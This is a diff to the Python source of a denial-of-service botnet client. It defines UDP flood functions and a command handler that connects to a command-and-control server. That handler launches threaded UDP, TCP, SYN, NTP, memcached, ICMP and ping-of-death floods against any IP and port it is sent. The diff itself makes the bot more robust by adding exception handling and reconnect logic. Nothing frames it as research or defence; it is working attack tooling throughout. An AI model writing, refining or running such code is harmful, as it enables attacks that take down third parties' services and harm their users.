@@ -106,15 +106,6 @@ def attack_hex(ip, port, secs):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
 
 def attack_roblox(ip, port, secs, size=65400):
     while time.time() < secs:
@@ -132,15 +123,6 @@ def attack_junk(ip, port, secs):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
 
 def handle_c2_connection(c2):
     c2.send('669787761736865726500'.encode())
@@ -157,91 +139,99 @@ def handle_c2_connection(c2):
             c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
             break
     while True:
-        data = c2.recv(1024).decode().strip()
-        if not data:
-            raise Exception
-        args = data.split(' ')
-        command = args[0].upper()
-        if command == '!UDP':
-            ip = args[1]
-            port = int(args[2])
-            secs = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
-        elif command == '!TCP':
-            ip = args[1]
-            port = int(args[2])
-            secs = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-        elif command == '!HEX':
-            ip = args[1]
-            port = int(args[2])
-            secs = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
-        elif command == '!ROBLOX':
-            ip = args[1]
-            port = int(args[2])
-            secs = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=attack_roblox, args=(ip, port, secs), daemon=True).start()
-        elif command == '!JUNK':
-            ip = args[1]
-            port = int(args[2])
-            secs = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
-                threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
-                threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-        elif command == '!NTP':
-            ip = args[1]
-            port = int(args[2])
-            timer = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
-        elif command == '!MEM':
-            ip = args[1]
-            port = int(args[2])
-            timer = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
-        elif command == '!ICMP':
-            ip = args[1]
-            timer = time.time() + int(args[2])
-            threads = int(args[3])
-            for _ in range(threads):
-                threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
-        elif command == '!POD':
-            ip = args[1]
-            timer = time.time() + int(args[2])
-            threads = int(args[3])
-            for _ in range(threads):
-                threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
-        elif command == '!SYN':
-            ip = args[1]
-            port = int(args[2])
-            secs = time.time() + int(args[3])
-            threads = int(args[4])
-            for _ in range(threads):
-                threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
-        elif command == '!PING':
-            c2.send('PONG'.encode())
+        try:
+            data = c2.recv(1024).decode().strip()
+            if not data:
+                break
+            args = data.split(' ')
+            command = args[0].upper()
+            print(f"Received request: {data}")
+            if command == '!UDP':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
+            elif command == '!TCP':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
+            elif command == '!HEX':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
+            elif command == '!ROBLOX':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=attack_roblox, args=(ip, port, secs), daemon=True).start()
+            elif command == '!JUNK':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
+            elif command == '!NTP':
+                ip = args[1]
+                port = int(args[2])
+                timer = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
+            elif command == '!MEM':
+                ip = args[1]
+                port = int(args[2])
+                timer = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
+            elif command == '!ICMP':
+                ip = args[1]
+                timer = time.time() + int(args[2])
+                threads = int(args[3])
+                for _ in range(threads):
+                    threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
+            elif command == '!POD':
+                ip = args[1]
+                timer = time.time() + int(args[2])
+                threads = int(args[3])
+                for _ in range(threads):
+                    threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
+            elif command == '!SYN':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+                for _ in range(threads):
+                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
+            elif command == '!PING':
+                c2.send('PONG'.encode())
+        except:
+            break
     c2.close()
 
 def reconnect_thread():
     while True:
-        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        c2.connect((C2_ADDRESS, C2_PORT))
-        threading.Thread(target=handle_c2_connection, args=(c2,), daemon=True).start()
+        try:
+            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            c2.connect((C2_ADDRESS, C2_PORT))
+            threading.Thread(target=handle_c2_connection, args=(c2,), daemon=True).start()
+        except:
+            if 'c2' in locals():
+                c2.close()
         time.sleep(1)
 
 def main():
